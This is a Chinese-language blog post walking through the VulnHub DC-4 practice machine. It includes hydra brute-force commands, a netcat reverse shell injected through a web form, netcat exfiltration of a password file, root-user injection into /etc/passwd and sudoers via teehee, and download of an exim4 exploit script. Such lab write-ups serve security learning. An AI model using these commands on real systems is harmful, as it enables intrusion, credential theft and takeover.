<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>vulnhub靶场记录DC-4 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶场DC-4通关记录靶场描述DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  Unlike the previous DC releases, this one is designed pr">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub靶场记录DC-4">
<meta property="og:url" content="http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="w3nx1z1">
<meta property="og:description" content="vulnhub靶场DC-4通关记录靶场描述DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  Unlike the previous DC releases, this one is designed pr">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
<meta property="article:published_time" content="2023-12-04T13:20:50.452Z">
<meta property="article:modified_time" content="2024-03-25T05:02:54.317Z">
<meta property="article:author" content="w3nx1z1">
<meta property="article:tag" content="打靶">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'vulnhub靶场记录DC-4',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-25 13:02:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶场记录DC-4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-04T13:20:50.452Z" title="发表于 2023-12-04 21:20:50">2023-12-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-25T05:02:54.317Z" title="更新于 2024-03-25 13:02:54">2024-03-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub靶场记录DC-4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶场DC-4通关记录"><a href="#vulnhub靶场DC-4通关记录" class="headerlink" title="vulnhub靶场DC-4通关记录"></a>vulnhub靶场DC-4通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.
</code></pre>
<h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先给靶机开启NAT桥接模式  在攻击机中使用nmap扫描靶机ip</p>
<pre><code>nmap 192.168.160.0/24
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041516844.png" alt="image-20231204151608787"></p>
<p>找打靶机ip</p>
<pre><code>192.168.160.155
</code></pre>
<p>再进一步扫一下端口</p>
<pre><code>nmap -A -p- -v 192.168.160.155
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041517935.png" alt="image-20231204151733892"></p>
<pre><code>开放了80端口 存在web服务 使用nginx中间件 版本1.15.10

开放了22端口 存在ssh服务 Openss版本7.4p1
</code></pre>
<p>在使用whatweb进行CMS识别 搜集一波信息</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521721.png" alt="image-20231204152115668"></p>
<p>在使用dirsearch扫一波目录</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041641121.png" alt="image-20231204164145053"></p>
<h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521221.png" alt="image-20231204152149183"></p>
<h4 id="爆破网站登陆密码"><a href="#爆破网站登陆密码" class="headerlink" title="爆破网站登陆密码"></a>爆破网站登陆密码</h4><p>使用bp或者hydra爆破都可以</p>
<pre><code>hydra -l admin -P /home/kali/Desktop/brutehash/rockyou.txt 192.168.160.155 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F
</code></pre>
<pre><code>-l 用户名
-L 用户名字典
-p 密码
-P 密码字典
http-post-form 使用http协议下的post方法进行破解
&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;：
1.&quot;/&quot;指登陆页面所在目录 该网站的登陆目录在index.php 
2.POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。USER对应前面的-l 后跟的用户名root，PASS会被字典中的密码逐个替换
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041711268.png" alt="image-20231204171144220"></p>
<p>密码是happy</p>
<p>bp爆破就用本机访问一下 抓个包 找几个字典 一秒爆出来了</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041712487.png" alt="image-20231204171250442"></p>
<p>使用<code>username:admin/password:happy</code>登陆</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041719106.png" alt="image-20231204171902074"></p>
<p>看起来有一个任意命令执行</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041736027.png" alt="image-20231204173657999"></p>
<p>执行了<code>ls -l</code></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738462.png" alt="image-20231204173842427"></p>
<p>执行了<code>du -h</code></p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738659.png" alt="image-20231204173857621"></p>
<p>执行了<code>df -h</code></p>
<p>抓个包看看</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041739572.png" alt="image-20231204173927523"></p>
<p>真是执行了<code>ls -l</code> 同时也看到这里空格是使用<code>+</code>表示的 那我们可以利用这一点反弹shell了</p>
<h3 id="三、反弹shell"><a href="#三、反弹shell" class="headerlink" title="三、反弹shell"></a>三、反弹shell</h3><p>先开一个终端 监听一下端口</p>
<pre><code>nc -lvvp 1145
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042027819.png" alt="image-20231204202758687"></p>
<p>再在bp上写入反弹shell的命令 </p>
<pre><code>nc 192.168.160.131 4444 -e /bin/bash
在这个环境中 空格要使用+代替
nc+192.168.160.131+4444+-e+/bin/bash
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042055519.png" alt="image-20231204205554477"></p>
<p>这边这个ip一定要写攻击机的</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042056474.png" alt="image-20231204205638442"></p>
<p>反弹成功</p>
<p>在用python创造一个交互式的shell</p>
<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042059878.png" alt="image-20231204205905844"></p>
<h4 id="找到并提取密码文件"><a href="#找到并提取密码文件" class="headerlink" title="找到并提取密码文件"></a>找到并提取密码文件</h4><p>在home文件夹下查看用户 找到三个用户</p>
<pre><code>charles jim sam
</code></pre>
<p>在<code>/home/jim/backups</code>下找到一个<code>old-passwords.bak</code> 查看内容 看起来很像字典 使用nc将这个文件保存到本机</p>
<p>现在攻击机下监听一个端口 指定接受一个文件</p>
<pre><code>nc -lvvp 5555 &gt; old-passwords.bak
</code></pre>
<p>再在shell里面监听相同的端口 指定发送上面的密码文件</p>
<pre><code>nc 192.168.160.131 5555 &lt; old-passwords.bak
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042114958.png" alt="image-20231204211415921"></p>
<p>接收到了</p>
<h3 id="四、登陆用户"><a href="#四、登陆用户" class="headerlink" title="四、登陆用户"></a>四、登陆用户</h3><h4 id="使用hydra爆破jim用户密码"><a href="#使用hydra爆破jim用户密码" class="headerlink" title="使用hydra爆破jim用户密码"></a>使用hydra爆破jim用户密码</h4><p>可以使用这个字典文件爆破jim用户的密码 还是使用hydra</p>
<pre><code>hydra -l jim -P old-passwords.bak ssh://192.168.160.155
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042118415.png" alt="image-20231204211835368"></p>
<p>爆破出密码为&#96;&#96;</p>
<h4 id="登陆jim用户-发现charles用户密码"><a href="#登陆jim用户-发现charles用户密码" class="headerlink" title="登陆jim用户 发现charles用户密码"></a>登陆jim用户 发现charles用户密码</h4><p>使用刚才爆出来的jim用户密码进行登陆</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051105493.png" alt="image-20231205110555449"></p>
<p>使用ssh也可以进行连接</p>
<pre><code>ssh jim@192.168.160.155
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051125436.png" alt="image-20231205112534390"></p>
<p>提示有一封邮件 </p>
<p>在<code>/var/mail</code>文件夹下找到邮件</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051141626.png" alt="image-20231205114140559"></p>
<p>这是一封charles发给jim的邮件 从中可以得到charles的登录密码为<code>^xHhA&amp;hvim0y</code></p>
<h3 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h3><h4 id="使用teehee进行提权"><a href="#使用teehee进行提权" class="headerlink" title="使用teehee进行提权"></a>使用teehee进行提权</h4><p>使用上面得到的密码 切换到charles用户后 查看这个用户有什么可以使用的root命令</p>
<pre><code>sudo -l
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051153811.png" alt="image-20231205115337768"></p>
<p>发现可以无密码使用teehee</p>
<p>先看一下用法</p>
<pre><code>teehee -h
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051415590.png" alt="image-20231205141537541"></p>
<p><code>-a</code>参数允许往一个文件中追加内容 </p>
<h5 id="1-x2F-etc-x2F-passwd"><a href="#1-x2F-etc-x2F-passwd" class="headerlink" title="1.&#x2F;etc&#x2F;passwd"></a>1.&#x2F;etc&#x2F;passwd</h5><p>我们可以利用这一点 向<code>/etc/passwd</code>文件中追加一个新的超级用户</p>
<p>先用openssl生成一个加盐的密码</p>
<pre><code>openssl passwd -1 -salt 1*2*3 abcd

# $1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1
</code></pre>
<p>使用teehee创建超级用户</p>
<pre><code>echo &#39;abc:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/bin/bash&#39; |sudo teehee -a /etc/passwd
</code></pre>
<p>登录abc用户 输入密码<code>abcd</code> 成功登录 是root权限</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051426768.png" alt="image-20231205142608726"></p>
<h5 id="2-x2F-etc-x2F-sudoers"><a href="#2-x2F-etc-x2F-sudoers" class="headerlink" title="2.&#x2F;etc&#x2F;sudoers"></a>2.&#x2F;etc&#x2F;sudoers</h5><p>相同的 我们也可以添加一个超级用户到<code>/etc/sudoers</code>中  </p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051526756.png" alt="image-20231205152634690"></p>
<p>我们可以使用teehee在&#x2F;etc&#x2F;sudoers文件后追加</p>
<pre><code>charles    ALL=(root) ALL
</code></pre>
<p>输入</p>
<pre><code>echo &#39;charles    ALL=(root) ALL&#39; |sudo teehee -a /etc/sudoers
</code></pre>
<p>在使用vi提权</p>
<pre><code>vi privilege.txt
输入charles用户密码
:!/bin/bash
</code></pre>
<p>在输入</p>
<pre><code>sudo -l
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051538862.png" alt="image-20231205153826818"></p>
<h4 id="exim4-suid-提权"><a href="#exim4-suid-提权" class="headerlink" title="exim4(suid)提权"></a>exim4(suid)提权</h4><p>首先查看charles用户可以使用suid提权的命令</p>
<pre><code>find / -type f -perm -u=s 2&gt;dev/null
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051558395.png" alt="image-20231205155804351"></p>
<p>其中<code>exim4</code>是可以进行提权的</p>
<p>但是不知道为啥charles用户用不了这个命令 那我们还回到最初的www-data用户</p>
<pre><code>exim4 --version
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051606235.png" alt="image-20231205160605193"></p>
<h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit exim 4
</code></pre>
<p>找到好几个都可以使用的提权脚本</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051618214.png" alt="image-20231205161805143"></p>
<p>选择第一个<code>46996.sh</code></p>
<h5 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2.利用脚本"></a>2.利用脚本</h5><p>找到脚本的路径</p>
<pre><code>searchsploit -p 46996.sh
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></p>
<p>将脚本复制到桌面</p>
<pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh 
</code></pre>
<p>开启apache服务</p>
<pre><code>systemctl start apache2.service
</code></pre>
<p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p>
<pre><code>mv 46996.sh /var/www/html 
</code></pre>
<p>将文件下载到靶机<code>/tmp</code>中</p>
<pre><code>wget http://192.168.160.150/46996.sh
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051630282.png" alt="image-20231205163009242"></p>
<p>看到此时用户对<code>46996.sh</code>并没有执行权限</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051631698.png" alt="image-20231205163148657"></p>
<p>赋予执行权限</p>
<pre><code>chmod +x 46996.sh
</code></pre>
<p>执行脚本 发现得到root权限</p>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051633173.png" alt="image-20231205163319129"></p>
<p>进入到root文件夹下 得到flag</p>
<pre><code>888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre>
<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051427051.png" alt="image-20231205142713009"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，DC-4靶机打完</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Deeeelete/article/details/106883762?ops_request_misc=&request_id=&biz_id=102&utm_term=kali%E4%B8%8A%E5%AE%89%E8%A3%85nc&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-106883762.142%5Ev96%5Epc_search_result_base9&spm=1018.2226.3001.4187">kali中nc实现通信、传输文件、反弹shell、python等脚本反弹shell</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">http://w3nx1z1.github.io/2023/12/04/vulnhub靶场DC-4通关记录/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub靶场记录DC-5</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/" title="vulnhub靶场记录DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub靶场记录DC-3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/" title="vulnhub靶场记录DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">vulnhub靶场记录DC-3</div></div></a></div><div><a href="/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/" title="vulnhub靶场记录DC-7"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-31</div><div class="title">vulnhub靶场记录DC-7</div></div></a></div><div><a href="/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/" title="vulnhub靶场记录DC-9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-13</div><div class="title">vulnhub靶场记录DC-9</div></div></a></div><div><a href="/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/" title="vulnhub靶场记录DC-8"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-03</div><div class="title">vulnhub靶场记录DC-8</div></div></a></div><div><a href="/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="title">vulnhub靶场记录DC-5</div></div></a></div><div><a href="/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/" title="vulnhub靶场记录DC-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-31</div><div class="title">vulnhub靶场记录DC-1</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div 